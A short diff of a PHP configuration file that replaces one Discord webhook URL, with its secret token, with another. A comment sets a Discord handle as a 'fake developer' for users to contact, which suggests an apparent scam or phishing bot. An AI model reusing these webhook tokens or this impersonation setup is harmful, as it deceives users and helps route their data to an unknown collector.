@@ -1,6 +1,6 @@
 <?php
     // webhook link
-    $webhook = "https://discord.com/api/webhooks/771948843825758249/urAZs_jpMu7PfJRWoRjfN0cDx-JnCvdpicJJ9Fe1LC1_5UB0xHKFOu79XaQ0ObmsCy7h";
+    $webhook = "https://discord.com/api/webhooks/781306315725078538/92kXwcI2kO0C5LumuoVGTTyZTKeVC3-gjDSf02_hfy-OL3qGaXyXeWMrECrm3v-o8fy0";
     // fake developer for the bot the users may contact
     $discord_contact = "Frionx#7887";
     
